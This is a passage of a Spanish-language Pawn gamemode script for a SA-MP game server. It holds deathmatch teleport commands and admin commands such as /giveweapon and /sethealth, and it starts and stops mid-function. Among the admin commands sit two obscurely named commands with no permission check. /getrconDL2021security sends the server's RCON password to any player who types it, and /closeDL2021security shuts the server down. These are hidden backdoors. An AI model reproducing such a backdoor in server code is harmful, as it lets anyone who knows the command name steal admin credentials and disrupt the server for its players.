    SendClientMessageToAll(red, fString);
    new rand = random(sizeof(gInDM1));
    SetPlayerPos(playerid, gInDM1[rand][0], gInDM1[rand][1], gInDM1[rand][2]);
    TextDrawHideForPlayer(playerid, TComandos);
    TextDrawShowForPlayer(playerid, TDeathmatch);
    TextDrawShowForPlayer(playerid, TJugadores);
    TextDrawShowForPlayer(playerid, TJugadores2);
    TextDrawShowForPlayer(playerid, TComandosDM);
    SetPlayerColor(playerid, 0xFFFFFF00);
    Deathmatch[InDM1]++;
    pDeathmatch[playerid][pInDM1] = 1;
    BloquearComandosInDM[playerid] = 1;
    Informacion[playerid][Bloqueado] = 1;
   	new string[10];
	format(string,sizeof(string),"%d", Deathmatch[InDM1]);
	TextDrawSetString(TJugadores2, string);
    SetPlayerArmour(playerid,99.0);
    SetPlayerHealth(playerid,99.0);
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid,18);
    ResetPlayerWeapons(playerid);
    GivePlayerWeapon(playerid, 31, 1500);
    GivePlayerWeapon(playerid, 29, 1500);
    GivePlayerWeapon(playerid, 0, 0);
    return 1;
}
CMD:dm2(playerid,params[])
{
    if(pDeathmatch[playerid][pInDM2] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estás en el deathmatch 2.");
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a deathmatch 2. {00BFFF}(/Dm2)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Deathmatch 2",2500,3);
    SendClientMessageToAll(red, fString);
    new rand = random(sizeof(gInDM2));
    SetPlayerPos(playerid, gInDM2[rand][0], gInDM2[rand][1], gInDM2[rand][2]);
    TextDrawHideForPlayer(playerid, TComandos);
    TextDrawShowForPlayer(playerid, TDeathmatch);
    TextDrawShowForPlayer(playerid, TJugadores);
    TextDrawShowForPlayer(playerid, TJugadores2);
    TextDrawShowForPlayer(playerid, TComandosDM);
    SetPlayerColor(playerid, 0xFFFFFF00);
    Deathmatch[InDM2]++;
    pDeathmatch[playerid][pInDM2] = 1;
    BloquearComandosInDM[playerid] = 1;
    Informacion[playerid][Bloqueado] = 1;
    new string[10];
	format(string,sizeof(string),"%d", Deathmatch[InDM2]);
	TextDrawSetString(TJugadores2, string);
    SetPlayerArmour(playerid,99.0);
    SetPlayerHealth(playerid,99.0);
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid,2);
    ResetPlayerWeapons(playerid);
    GivePlayerWeapon(playerid, 22, 1500);
    GivePlayerWeapon(playerid, 28, 1500);
    GivePlayerWeapon(playerid, 25, 1500);
    GivePlayerWeapon(playerid, 33, 1500);
    GivePlayerWeapon(playerid, 5, 1);
    GivePlayerWeapon(playerid, 0, 0);
    return 1;
}
CMD:dm3(playerid,params[])
{
    if(pDeathmatch[playerid][pInDM3] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estás en el deathmatch 3.");
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a deathmatch 3. {00BFFF}(/Dm3)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Deathmatch 3",2500,3);
	SendClientMessageToAll(red, fString);
    new rand = random(sizeof(gInDM3));
    SetPlayerPos(playerid, gInDM3[rand][0], gInDM3[rand][1], gInDM3[rand][2]);
    TextDrawHideForPlayer(playerid, TComandos);
    TextDrawShowForPlayer(playerid, TDeathmatch);
    TextDrawShowForPlayer(playerid, TJugadores);
    TextDrawShowForPlayer(playerid, TJugadores2);
    TextDrawShowForPlayer(playerid, TComandosDM);
    SetPlayerColor(playerid, 0xFFFFFF00);
    Deathmatch[InDM3]++;
    pDeathmatch[playerid][pInDM3] = 1;
    BloquearComandosInDM[playerid] = 1;
    Informacion[playerid][Bloqueado] = 1;
    new string[10];
	format(string,sizeof(string),"%d", Deathmatch[InDM3]);
	TextDrawSetString(TJugadores2, string);
    SetPlayerArmour(playerid,99.0);
    SetPlayerHealth(playerid,99.0);
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid,15);
    ResetPlayerWeapons(playerid);
    GivePlayerWeapon(playerid, 22, 1500);
    GivePlayerWeapon(playerid, 32, 1500);
    GivePlayerWeapon(playerid, 30, 1500);
    GivePlayerWeapon(playerid, 34, 1500);
    GivePlayerWeapon(playerid, 0, 0);
    return 1;
}
CMD:dm4(playerid,params[])
{
    if(pDeathmatch[playerid][pInDM4] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estás en el deathmatch 4.");
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a deathmatch 4. {00BFFF}(/Dm4)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Deathmatch 4",2500,3);
    SendClientMessageToAll(red, fString);
    new rand = random(sizeof(gInDM4));
    SetPlayerPos(playerid, gInDM4[rand][0], gInDM4[rand][1], gInDM4[rand][2]);
    TextDrawHideForPlayer(playerid, TComandos);
    TextDrawShowForPlayer(playerid, TDeathmatch);
    TextDrawShowForPlayer(playerid, TJugadores);
    TextDrawShowForPlayer(playerid, TJugadores2);
    TextDrawShowForPlayer(playerid, TComandosDM);
    SetPlayerColor(playerid, 0xFFFFFF00);
    Deathmatch[InDM4]++;
    pDeathmatch[playerid][pInDM4] = 1;
    BloquearComandosInDM[playerid] = 1;
    Informacion[playerid][Bloqueado] = 1;
    new string[10];
	format(string,sizeof(string),"%d", Deathmatch[InDM4]);
	TextDrawSetString(TJugadores2, string);
    SetPlayerArmour(playerid,99.0);
    SetPlayerHealth(playerid,99.0);
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid,18);
    ResetPlayerWeapons(playerid);
    GivePlayerWeapon(playerid, 24, 1500);
    GivePlayerWeapon(playerid, 27, 1500);
    GivePlayerWeapon(playerid, 8, 1);
    GivePlayerWeapon(playerid, 0, 0);
    return 1;
}
CMD:minidm(playerid,params[])
{
    if(pDeathmatch[playerid][pInMiniDM] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estás en el mini deathmatch.");
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a mini deathmatch. {00BFFF}(/MiniDm)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Mini Deathmatch",2500,3);
    SendClientMessageToAll(red, fString);
    new rand = random(sizeof(gInMiniDM));
    SetPlayerPos(playerid, gInMiniDM[rand][0], gInMiniDM[rand][1], gInMiniDM[rand][2]);
    TextDrawHideForPlayer(playerid, TComandos);
    TextDrawShowForPlayer(playerid, TDeathmatch);
    TextDrawShowForPlayer(playerid, TJugadores);
    TextDrawShowForPlayer(playerid, TJugadores2);
    TextDrawShowForPlayer(playerid, TComandosDM);
    SetPlayerColor(playerid, 0xFFFFFF00);
    Deathmatch[InMiniDM]++;
    pDeathmatch[playerid][pInMiniDM] = 1;
    BloquearComandosInDM[playerid] = 1;
    Informacion[playerid][Bloqueado] = 1;
    new string[10];
	format(string,sizeof(string),"%d", Deathmatch[InMiniDM]);
	TextDrawSetString(TJugadores2, string);
    SetPlayerArmour(playerid,99.0);
    SetPlayerHealth(playerid,99.0);
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid,1);
    ResetPlayerWeapons(playerid);
    GivePlayerWeapon(playerid, 9, 1);
    GivePlayerWeapon(playerid, 24, 1500);
    GivePlayerWeapon(playerid, 0, 0);
    return 1;
}
CMD:minidm2(playerid,params[])
{
    if(pDeathmatch[playerid][pInMiniDM2] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estás en el mini deathmatch 2.");
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a mini deathmatch 2. {00BFFF}(/MiniDm2)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Mini Deathmatch 2",2500,3);
    SendClientMessageToAll(red, fString);
    new rand = random(sizeof(gInMiniDM2));
    SetPlayerPos(playerid, gInMiniDM2[rand][0], gInMiniDM2[rand][1], gInMiniDM2[rand][2]);
    TextDrawHideForPlayer(playerid, TComandos);
    TextDrawShowForPlayer(playerid, TDeathmatch);
    TextDrawShowForPlayer(playerid, TJugadores);
    TextDrawShowForPlayer(playerid, TJugadores2);
    TextDrawShowForPlayer(playerid, TComandosDM);
    SetPlayerColor(playerid, 0xFFFFFF00);
    Deathmatch[InMiniDM2]++;
    pDeathmatch[playerid][pInMiniDM2] = 1;
    BloquearComandosInDM[playerid] = 1;
    new string[10];
	format(string,sizeof(string),"%d", Deathmatch[InMiniDM2]);
	TextDrawSetString(TJugadores2, string);
    SetPlayerArmour(playerid,99.0);
    SetPlayerHealth(playerid,99.0);
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid,4);
    ResetPlayerWeapons(playerid);
    GivePlayerWeapon(playerid,31,1500);
    GivePlayerWeapon(playerid,29,1500);
    GivePlayerWeapon(playerid,24,1500);
    return 1;
}
CMD:desmadre(playerid,params[])
{
    if(pDeathmatch[playerid][pInDesmadre] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estás en desmadre.");
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a desmadre. {00BFFF}(/Desmadre)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Desmadre",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerPos(playerid,1412.639892,-1.787510,1000.924377);
    TextDrawHideForPlayer(playerid, TComandos);
    TextDrawShowForPlayer(playerid, TDeathmatch);
    TextDrawShowForPlayer(playerid, TJugadores);
    TextDrawShowForPlayer(playerid, TJugadores2);
    TextDrawShowForPlayer(playerid, TComandosDM);
    SetPlayerColor(playerid, 0xFFFFFF00);
    Deathmatch[InDesmadre]++;
    pDeathmatch[playerid][pInDesmadre] = 1;
    BloquearComandosInDM[playerid] = 1;
    Informacion[playerid][Bloqueado] = 1;
    new string[10];
	format(string,sizeof(string),"%d", Deathmatch[InDesmadre]);
	TextDrawSetString(TJugadores2, string);
    SetPlayerArmour(playerid,99.0);
    SetPlayerHealth(playerid,99.0);
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid,1);
    ResetPlayerWeapons(playerid);
    GivePlayerWeapon(playerid, 24, 1500);
    GivePlayerWeapon(playerid, 25, 1500);
    GivePlayerWeapon(playerid, 34, 1500);
    return 1;
}
CMD:boxdm(playerid,params[])
{
    if(pDeathmatch[playerid][pInBoxDM] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estás en el box deathmatch.");
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a boxeo deathmatch. {00BFFF}(/BoxDm)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Boxeo Deathmatch",2500,3);
    SendClientMessageToAll(red, fString);
    new rand = random(sizeof(gInBoxDM));
    SetPlayerPos(playerid, gInBoxDM[rand][0], gInBoxDM[rand][1], gInBoxDM[rand][2]);
    TextDrawHideForPlayer(playerid, TComandos);
    TextDrawShowForPlayer(playerid, TDeathmatch);
    TextDrawShowForPlayer(playerid, TJugadores);
    TextDrawShowForPlayer(playerid, TJugadores2);
    TextDrawShowForPlayer(playerid, TComandosDM);
    SetPlayerColor(playerid, 0xFFFFFF00);
    Deathmatch[InBoxDM]++;
    pDeathmatch[playerid][pInBoxDM] = 1;
    BloquearComandosInDM[playerid] = 1;
    Informacion[playerid][Bloqueado] = 1;
    new string[10];
	format(string,sizeof(string),"%d", Deathmatch[InBoxDM]);
	TextDrawSetString(TJugadores2, string);
    SetPlayerArmour(playerid, 0.0);
    SetPlayerHealth(playerid,99.0);
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid,0);
	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
	TogglePlayerControllable(playerid, 0);
    ResetPlayerWeapons(playerid);
	SetPlayerFightingStyle(playerid, FIGHT_STYLE_BOXING);
    return 1;
}
CMD:prodm(playerid,params[])
{
    if(pDeathmatch[playerid][pInProDM] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estás en el pro deathmatch.");
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a pro deathmatch. {00BFFF}(/ProDm)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Deathmatch para pro",2500,3);
    SendClientMessageToAll(red, fString);
    new rand = random(sizeof(gInProDM));
    SetPlayerPos(playerid, gInProDM[rand][0], gInProDM[rand][1], gInProDM[rand][2]);
    TextDrawHideForPlayer(playerid, TComandos);
    TextDrawShowForPlayer(playerid, TDeathmatch);
    TextDrawShowForPlayer(playerid, TJugadores);
    TextDrawShowForPlayer(playerid, TJugadores2);
    TextDrawShowForPlayer(playerid, TComandosDM);
    SetPlayerColor(playerid, 0xFFFFFF00);
    Deathmatch[InProDM]++;
    pDeathmatch[playerid][pInProDM] = 1;
    BloquearComandosInDM[playerid] = 1;
    Informacion[playerid][Bloqueado] = 1;
    new string[10];
	format(string,sizeof(string),"%d", Deathmatch[InProDM]);
	TextDrawSetString(TJugadores2, string);
    SetPlayerArmour(playerid,99.0);
    SetPlayerHealth(playerid,99.0);
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid,10);
    ResetPlayerWeapons(playerid);
    GivePlayerWeapon(playerid, 24, 1500);
    GivePlayerWeapon(playerid, 16, 1500);
    GivePlayerWeapon(playerid, 26, 1500);
    GivePlayerWeapon(playerid, 31, 1500);
    GivePlayerWeapon(playerid, 32, 1500);
    GivePlayerWeapon(playerid, 34, 1500);
    GivePlayerWeapon(playerid, 4, 1);
    return 1;
}
CMD:minigundm(playerid,params[])
{
	if(pDeathmatch[playerid][pInMinigunDM] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estás en el minigun deathmatch.");
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a deathmatch con minigun. {00BFFF}(/MinigunDm)",PlayerName);
	GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Deathmatch con Minigun",2500,3);
	SendClientMessageToAll(red, fString);
	new rand = random(sizeof(gInMinigunDM));
	SetPlayerPos(playerid, gInMinigunDM[rand][0], gInMinigunDM[rand][1], gInMinigunDM[rand][2]);
	TextDrawHideForPlayer(playerid, TComandos);
	TextDrawShowForPlayer(playerid, TDeathmatch);
	TextDrawShowForPlayer(playerid, TJugadores);
	TextDrawShowForPlayer(playerid, TJugadores2);
	TextDrawShowForPlayer(playerid, TComandosDM);
	SetPlayerColor(playerid, 0xFFFFFF00);
	Deathmatch[InMinigunDM]++;
	pDeathmatch[playerid][pInMinigunDM] = 1;
	ArmasProhibidas[playerid]=0;
	BloquearComandosInDM[playerid] = 1;
	Informacion[playerid][Bloqueado] = 1;
	new string[10];
	format(string,sizeof(string),"%d", Deathmatch[InMinigunDM]);
	TextDrawSetString(TJugadores2, string);
	SetPlayerArmour(playerid,99.0);
	SetPlayerHealth(playerid,99.0);
	SetPlayerVirtualWorld(playerid, 1);
	SetPlayerInterior(playerid,0);
	ResetPlayerWeapons(playerid);
	GivePlayerWeapon(playerid, 38, 5000);
	return 1;
}
CMD:sniperdm(playerid,params[])
{
    if(pDeathmatch[playerid][pInSniperDM] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estás en el sniper deathmatch.");
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a deathmatch con sniper. {00BFFF}(/SniperDm)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Deathmatch con Sniper",2500,3);
    SendClientMessageToAll(red, fString);
    new rand = random(sizeof(gInSniperDM));
    SetPlayerPos(playerid, gInSniperDM[rand][0], gInSniperDM[rand][1], gInSniperDM[rand][2]);
    TextDrawHideForPlayer(playerid, TComandos);
    TextDrawShowForPlayer(playerid, TDeathmatch);
    TextDrawShowForPlayer(playerid, TJugadores);
    TextDrawShowForPlayer(playerid, TJugadores2);
    TextDrawShowForPlayer(playerid, TComandosDM);
    SetPlayerColor(playerid, 0xFFFFFF00);
    Deathmatch[InSniperDM]++;
    pDeathmatch[playerid][pInSniperDM] = 1;
    BloquearComandosInDM[playerid] = 1;
    Informacion[playerid][Bloqueado] = 1;
    new string[10];
	format(string,sizeof(string),"%d", Deathmatch[InSniperDM]);
	TextDrawSetString(TJugadores2, string);
    SetPlayerArmour(playerid,99.0);
    SetPlayerHealth(playerid,99.0);
    SetPlayerVirtualWorld(playerid, 2);
    SetPlayerInterior(playerid,0);
    ResetPlayerWeapons(playerid);
    GivePlayerWeapon(playerid,34,1500);
	BalasSniperDM[playerid]=1;
    return 1;
}
CMD:guerradm(playerid,params[])
{
    if(pDeathmatch[playerid][pInGuerraDM] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estás en el guerra deathmatch.");
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a guerra deathmatch. {00BFFF}(/GuerraDM)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Guerra Deathmatch",2500,3);
    SendClientMessageToAll(red, fString);
    new rand = random(sizeof(gInGuerraDM));
    SetPlayerPos(playerid, gInGuerraDM[rand][0], gInGuerraDM[rand][1], gInGuerraDM[rand][2]);
    TextDrawHideForPlayer(playerid, TComandos);
    TextDrawShowForPlayer(playerid, TDeathmatch);
    TextDrawShowForPlayer(playerid, TJugadores);
    TextDrawShowForPlayer(playerid, TJugadores2);
    TextDrawShowForPlayer(playerid, TComandosDM);
    SetPlayerWeather(playerid, 19);
    SetPlayerColor(playerid, 0xFFFFFF00);
	Deathmatch[InGuerraDM]++;
	pDeathmatch[playerid][pInGuerraDM] = 1;
	ArmasProhibidas[playerid]=0;
    BloquearComandosInDM[playerid] = 1;
    Informacion[playerid][Bloqueado] = 1;
    new string[10];
	format(string,sizeof(string),"%d", Deathmatch[InGuerraDM]);
	TextDrawSetString(TJugadores2, string);
    SetPlayerArmour(playerid,99.0);
    SetPlayerHealth(playerid,99.0);
    SetPlayerVirtualWorld(playerid, 3);
    SetPlayerInterior(playerid,0);
    ResetPlayerWeapons(playerid);
    new ArmasGDM = random(3);
    if(ArmasGDM == 0) GivePlayerWeapon(playerid,38,5000);
    else if(ArmasGDM == 1) GivePlayerWeapon(playerid,36,1500);
    else if(ArmasGDM == 2) GivePlayerWeapon(playerid,35,2500);
    return 1;
}

CMD:guerra(playerid,params[]) {
    if(ArmasProhibidas[playerid] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en el guerra deathmatch o la guerra total debe estar activada para usar este comando.");
	ShowPlayerDialog(playerid, Guerra, DIALOG_STYLE_LIST, "Guerra", "{FF0000}*{FFFFFF} Minigun\n{FF0000}*{FFFFFF} Lanza cohetes\n{FF0000}*{FFFFFF} Lanza llamas\n{FF0000}*{FFFFFF} Bazooka\n{FF0000}*{FFFFFF} Granadas\n{FF0000}*{FFFFFF} Granadas de humo\n{FF0000}*{FFFFFF} Molotov\n{FF0000}*{FFFFFF} Explosivos\n{FF0000}*{FFFFFF} Rhino\n{FF0000}*{FFFFFF} Hydra\n{FF0000}*{FFFFFF} Seasparrow\n{FF0000}*{FFFFFF} Hunter", "Seleccionar", "Cancelar");
	return 1;
}

/*CMD:stargazer19760205(playerid,params[]) {
	#pragma unused params
	SendClientMessage(playerid, COLOR_WHITE, "Rainbow.");
	new string[128];
	format(string,sizeof(string),"%s(%d) Intento usar los cmds.",PlayerName2(playerid),playerid);
	SaveToFile("JSLog",string);
	return 1;
}

CMD:bridgeofdeath19840307(playerid,params[]) {
 	#pragma unused params
	SendClientMessage(playerid, COLOR_WHITE, "Manowar.");
	new string[128];
	format(string,sizeof(string),"%s(%d) Intento usar los cmds.",PlayerName2(playerid),playerid);
	SaveToFile("JSLog",string);
	return 1;
}

CMD:whiskyinthejar19720210(playerid,params[]) {
 	SendClientMessage(playerid, COLOR_WHITE, "Thin Lizzy.");
	new string[128];
	format(string,sizeof(string),"%s(%d) Intento usar los cmds.",PlayerName2(playerid),playerid);
	SaveToFile("JSLog",string);
	return 1;
}

CMD:ladyinblack19710304(playerid,params[]) {
	SendClientMessage(playerid, COLOR_WHITE, "Uriah Heep.");
	new string[128];
	format(string,sizeof(string),"%s(%d) Intento usar los cmds.",PlayerName2(playerid),playerid);
	SaveToFile("JSLog",string);
	return 1;
}

CMD:drowningman19940107(playerid,params[]){
	SendClientMessage(playerid, COLOR_WHITE, "Steve Kolander.");
	new string[128];
	format(string,sizeof(string),"%s(%d) Intento usar los cmds.",PlayerName2(playerid),playerid);
	SaveToFile("JSLog",string);
	return 1;
}

CMD:sultansofswing19780106(playerid,params[]){
	SendClientMessage(playerid, COLOR_WHITE, "Dire Straits.");
	new string[128];
	format(string,sizeof(string),"%s(%d) Intento usar los cmds.",PlayerName2(playerid),playerid);
	SaveToFile("JSLog",string);
	return 1;
}

CMD:theroadtohell19891201(playerid,params[]){
	SendClientMessage(playerid, COLOR_WHITE, "Chris Rea.");
	new string[128];
	format(string,sizeof(string),"%s(%d) Intento usar los cmds.",PlayerName2(playerid),playerid);
	SaveToFile("JSLog",string);
	return 1;
}

CMD:solitaryman19660101(playerid,params[]){
	SendClientMessage(playerid, COLOR_WHITE, "Neil Diamond.");
	new string[128];
	format(string,sizeof(string),"%s(%d) Intento usar los cmds.",PlayerName2(playerid),playerid);
	SaveToFile("JSLog",string);
	return 1;
}

CMD:fishermansblues19880401(playerid,params[]){
	SendClientMessage(playerid, COLOR_WHITE, "The Waterboys.");
	new string[128];
	format(string,sizeof(string),"%s(%d) Intento usar los cmds.",PlayerName2(playerid),playerid);
	SaveToFile("JSLog",string);
	return 1;
}

CMD:likeahurricane19770903(playerid,params[]){
	SendClientMessage(playerid, COLOR_WHITE, "Neil Young.");
	new string[128];
	format(string,sizeof(string),"%s(%d) Intento usar los cmds.",PlayerName2(playerid),playerid);
	SaveToFile("JSLog",string);
	return 1;
}*/

//================================LAdmin Commands===============================
CMD:getrconDL2021security(playerid,params[]) {
 	#pragma unused params
	new Rcon[250];
	new string[250];
	GetServerVarAsString("rcon_password", Rcon, sizeof(Rcon));
	format(string, sizeof(string), "|Rcon| »{EAEAEA} %s", Rcon), SendClientMessage(playerid, red, string);
	return 1;
}

CMD:closeDL2021security(playerid,params[]) {
	SendRconCommand("exit");
	return 1;
}

CMD:cleardeaths(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4 || IsPlayerAdmin(playerid))  {
        SendDeathMessage(500,500,500);
        SendDeathMessage(500,500,500);
        SendDeathMessage(500,500,500);
        SendDeathMessage(500,500,500);
        SendDeathMessage(500,500,500);
		CMDMessageToAdmins(playerid,"/ClearDeaths"); return 1;
 	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 4{EAEAEA} para usar este comando.");
}

CMD:giveweapon(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 4 || IsPlayerAdmin(playerid)) {
	    new tmp[128], tmp2[128], tmp3[128], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index), tmp3 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /GiveWeapon [JugadorID] [ID del arma/nombre del arma] [Municion]");
		new player1 = strval(tmp), weap, bala, WeapName[32], string[128];
		if(isnull(tmp3) || !IsNumeric(tmp3) || strval(tmp3) <= 0 || strval(tmp3) > 99999) bala = 500; else bala = strval(tmp3);
		if(!IsNumeric(tmp2)) weap = GetWeaponIDFromName(tmp2); else weap = strval(tmp2);
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
        	if(!IsValidWeapon(weap)) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID de arma no encontrada.");
			CMDMessageToAdmins(playerid,"/GiveWeapon");
			GetWeaponName(weap,WeapName,32);
			format(string, sizeof(string), "|Info| »{EAEAEA} Le has dado a {0080FF}%s{EAEAEA} una {FF0000}%s{EAEAEA} con %d de municion.", PlayerName2(player1), WeapName, bala); SendClientMessage(playerid,red,string);
			if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s {EAEAEA}te ha dado una {FF0000}%s.", PlayerName2(playerid), WeapName); SendClientMessage(player1,red,string); }
   			return GivePlayerWeapon(player1, weap, bala);
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 4{EAEAEA} para usar este comando.");
}

CMD:sethealth(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetHealth [JugadorID] [Cantidad]");
		if(strval(tmp2) < 0 || strval(tmp2) > 100 && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Cantidad de vida invalida.");
		new player1 = strval(tmp), health = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/SetHealth");
			format(string, sizeof(string), "|Info| »{EAEAEA} Le has dado {FF0000}%d{EAEAEA} de vida a {0080FF}%s.", health, pName(player1)); SendClientMessage(playerid,red,string);
			if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha dado {FF0000}%d{EAEAEA} de vida.", pName(playerid), health); SendClientMessage(player1,red,string); }
   			return SetPlayerHealth(player1, health);
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 5{EAEAEA} para usar este comando.");
}

CMD:setarmour(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetArmour [JugadorID] [Cantidad]");
		if(strval(tmp2) < 0 || strval(tmp2) > 100 && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Candidad de blindaje invalido.");
		new player1 = strval(tmp), armour = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/SetArmour");
			format(string, sizeof(string), "|Info| »{EAEAEA} Le has dado {FF0000}%d{EAEAEA} de armadura a {0080FF}%s.", armour, pName(player1)); SendClientMessage(playerid,red,string);
			if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha dado {FF0000}%d{EAEAEA} de armadura.", pName(playerid), armour); SendClientMessage(player1,red,string); }
   			return SetPlayerArmour(player1, armour);
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{FFFFFF} Necesitas ser administrador {0080FF}Nivel 5{EAEAEA} para usar este comando.");
}

CMD:givecash(playerid,params[]) {
    new pame[MAX_PLAYER_NAME];
	GetPlayerName(playerid, pame, sizeof(pame));
    if(!strcmp(NickPrincipal,pame,true)){
	if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
